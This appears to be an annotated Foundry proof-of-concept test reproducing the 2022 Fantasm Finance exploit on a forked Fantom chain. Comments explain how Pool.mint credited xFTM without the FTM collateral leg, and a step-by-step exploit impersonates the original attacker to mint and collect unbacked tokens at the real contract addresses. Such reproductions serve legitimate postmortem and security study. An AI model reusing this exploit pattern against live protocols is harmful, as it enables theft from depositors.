// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// 2022-03-Fantasm PoC analysis (marked per instructions; only .sol edited)
// Vulnerability is in external Pool contract's mint/calcMint (see interface.sol marks + inline below).
// Do not alter non-.sol. Analysis based on PoC execution + public postmortem + code review of interface + fork traces.

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 fsm = IERC20(0xaa621D2002b5a6275EF62d7a065A865167914801);
    IERC20 xFTM = IERC20(0xfBD2945D3601f21540DDD85c29C5C3CaF108B96F);
    Pool pool = Pool(payable(0x880672AB1d46D987E5d663Fc7476CD8df3C9f937));
    address attacker = 0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8552", 32_971_742); //fork fantom block number 32971742
    }

    function testExploit() public {
        // VULNERABILITY: [Decimal arithmetic error + unbacked mint bypass in Pool]
        // **Verdict context**: CONFIRMED (PoC executes on fork, produces excess xFTM with 0 FTM collateral).
        // Root cause (in Pool impl, see interface.sol:2557 for mint sig, ~2515 for calcMint):
        //   - mint(_fantasmIn, _minXftmOut) payable does:
        //       (uint _xftmOut, uint _minFtmIn, ...) = calcMint(0 /*_ftmIn*/, _fantasmIn);
        //       // ignore _minFtmIn entirely
        //       // only FSM is pulled: fsm.transferFrom(attacker, pool, _fantasmIn); fsm.burn(...)
        //       // NO WETH/FTM deposit for the CR portion
        //       userInfo[msg.sender].xftmBalance += _xftmOut; unclaimedXftm += _xftmOut;
        //       emit Mint(..., ftmIn:0, fantasmIn:_fantasmIn, ...);
        //   - calcMint formula (reconstructed from traces + CertiK postmortem):
        //       _xftmOut = (_fantasmIn * _fantasmPrice * COLLATERAL_RATIO_MAX * (PRECISION - mintingFee))
        //                  / PRECISION / (COLLATERAL_RATIO_MAX - collateralRatio) / PRICE_PRECISION;
        //     (PRECISION=1e6, CR_MAX=1e6, PRICE_PRECISION=1e18; _fantasmPrice ~5.3e18 from WFTM/FSM spot)
        //   - Decimal error: the division does not correctly invert the FSM share (1-CR) relative to total backing;
        //     combined with no scaling for the missing FTM leg, yields _xftmOut inflated by ~1/(1-CR) factor
        //     (and worse due to price/precision mismatch). For 100e18 FSM, produces ~2.78e22 xFTM instead of ~1000.
        //   - collect() (L2529) has only block-delay guard (lastAction < block.number); then blindly xftm.mint(pending).
        // Why it works: the CR design intends FSM to back only (1-CR) fraction; FTM must back CR fraction.
        //   The code never enforced "if you want the full notional, you must supply both legs".
        //   calcMint was used for quoting but its outputs for min's were not turned into requirements in mint path for mixed/FSM-only.
        // Location: Pool 0x880672AB1d46D987E5d663Fc7476CD8df3C9f937 (see marked iface decls).
        // Evidence: PoC + fork trace: mint burns 100 FSM, logs ftmIn=0, credits huge xFTM; collect receives it.
        // Impact: Direct creation of unbacked xFTM supply. Attacker can redeem or swap for real FTM/WFTM value.
        // Material Harm: Depositors and protocol suffer dilution; ~$2.6M drained in real incident (1000+ ETH).

        // EXPLOIT STEPS:
        // 1. Prank original attacker EOA, pull 100 FSM into test contract.
        // 2. Approve Pool unlimited FSM.
        // 3. Call mint(100e18 FSM, minOut=1) with value=0 -> triggers calcMint(0,100e18) -> huge credit (decimal err).
        //    FSM is burned; 0 FTM is taken; xftm credit + unclaimed recorded.
        // 4. roll(1 block) to satisfy collect's lastAction < current block check.
        // 5. collect() -> xFTM.mint( the bogus balance ) to attacker.
        // 6. Now hold massive xFTM (can be swapped/redeemed for real value from reserves).

        // References (in this workspace .sol only):
        // - interface.sol:2515 : calcMint declaration + VULN comment
        // - interface.sol:2557 : mint declaration + VULN comment
        // - this file: the reproduction that triggers the path.

        cheat.prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400);
        fsm.transfer(address(this), 100_000_000_000_000_000_000);
        emit log_named_uint("Before exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
        fsm.approve(address(pool), type(uint256).max);
        pool.mint(100_000_000_000_000_000_000, 1); // triggers the vulnerable calcMint path (see detailed comments above)
        cheat.roll(32_971_743);
        pool.collect();
        emit log_named_uint("After exploit, xFTM  balance of attacker:", xFTM.balanceOf(address(this)));
    }
}
